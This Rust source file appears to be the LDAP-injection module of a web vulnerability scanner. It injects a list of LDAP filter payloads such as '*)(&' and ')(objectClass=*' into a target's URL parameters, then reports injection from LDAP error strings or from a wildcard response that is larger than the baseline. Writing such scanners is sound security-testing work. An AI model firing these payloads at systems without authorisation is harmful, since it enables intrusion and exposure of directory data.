use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// LDAP Injection detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: LDAP Injection", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() { return Ok(()); }

    let client = HttpClient::new()?;
    let baseline = Analyzer::send_and_analyze(&client, target, "").await?;

    let ldap_errors = vec![
        "invalid dn syntax", "bad search filter", "ldap_search",
        "javax.naming.directory", "InvalidSearchFilterException",
        "NamingException", "ldap error", "size limit exceeded",
    ];

    for (param_name, original_val) in &params {
        let payloads = vec![
            format!("{})(objectClass=*", original_val),
            format!("{}*)(|(objectClass=*", original_val),
            format!("{})(|(cn=*", original_val),
            format!("{}%29%28objectClass%3D*", original_val),
            "*".to_string(),
            "*)(&".to_string(),
            "*()|%26'".to_string(),
        ];

        for payload in &payloads {
            let url = Analyzer::inject_param(target, param_name, &payload)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, "").await {
                let body_lower = result.response_body.to_lowercase();
                for err in &ldap_errors {
                    if body_lower.contains(err) {
                        println!(
                            "{} CONFIRMED: LDAP Injection in param '{}' (error-based)",
                            "[!]".red().bold(), param_name
                        );
                        println!("    Error: {}", err);
                        return Ok(());
                    }
                }

                // Boolean-based: wildcard should return more results
                if payload == "*" && result.response_body.len() > baseline.response_body.len() + 200 {
                    println!(
                        "{} POTENTIAL: LDAP Injection in param '{}' (wildcard returned extra data)",
                        "[!]".red().bold(), param_name
                    );
                }
            }
        }
    }

    Ok(())
}
